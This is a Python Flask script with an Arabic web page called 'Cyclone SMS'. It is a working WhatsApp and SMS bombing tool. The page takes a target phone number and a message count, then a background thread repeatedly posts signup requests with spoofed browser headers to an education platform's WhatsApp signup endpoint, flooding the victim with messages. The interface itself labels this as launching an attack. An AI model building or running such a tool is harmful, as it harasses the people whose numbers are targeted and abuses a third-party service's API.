from flask import Flask, render_template_string, request
import requests
import threading
import time

app = Flask(__name__)

# واجهة احترافية بلمسة منصة أبواب
html_layout = """
<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إعصار السبام - عباس</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #0f172a; color: white; text-align: center; padding: 20px; }
        .card { background: #1e293b; padding: 25px; border-radius: 15px; max-width: 400px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #334155; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: white; }
        .btn { background: #ef4444; color: white; padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; }
        .btn:hover { background: #dc2626; transform: scale(1.02); }
        .footer { margin-top: 20px; font-size: 12px; color: #94a3b8; }
    </style>
</head>
<body>
    <div class="card">
        <h1 style="color: #ef4444;">🌀 Cyclone SMS</h1>
        <p>سبام واتساب (منصة أبواب)</p>
        <form action="/start" method="POST">
            <input type="text" name="phone" placeholder="رقم الهاتف (بدون 0)" required>
            <input type="number" name="limit" placeholder="عدد الرسائل" required>
            <button type="submit" class="btn">🚀 بدء الهجوم</button>
        </form>
        <div class="footer">تنبيه: السيرفر لازم يبقى شغال بـ Pydroid</div>
    </div>
</body>
</html>
"""

def spam_task(phone, limit):
    # كود سبام أبواب الحقيقي اللي سويناه بالبداية
    url = "https://gw.abgateway.com/student/whatsapp/signup"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 11)',
        'Content-Type': 'application/json',
        'origin': 'https://abwaab.com',
        'referer': 'https://abwaab.com/'
    }
    payload = {
        "language": "ar", "password": "pass123", "phone": "+964" + phone,
        "country": "IQ", "country_code": "964", "platform": "web"
    }
    
    for _ in range(int(limit)):
        try:
            requests.post(url, json=payload, headers=headers, timeout=10)
            time.sleep(2) # انتظار بين الرسائل
        except:
            pass

@app.route('/')
def home():
    return render_template_string(html_layout)

@app.route('/start', methods=['POST'])
def start():
    phone = request.form['phone']
    limit = request.form['limit']
    # تشغيل السبام في الخلفية حتى ميعلق الموقع
    threading.Thread(target=spam_task, args=(phone, limit)).start()
    return f"<h2>✅ بدأ الهجوم على {phone}!</h2><p>عدد الرسائل: {limit}</p><a href='/' style='color:white;'>رجوع</a>"

if __name__ == '__main__':
    # تشغيل السيرفر
    app.run(host='0.0.0.0', port=5000)
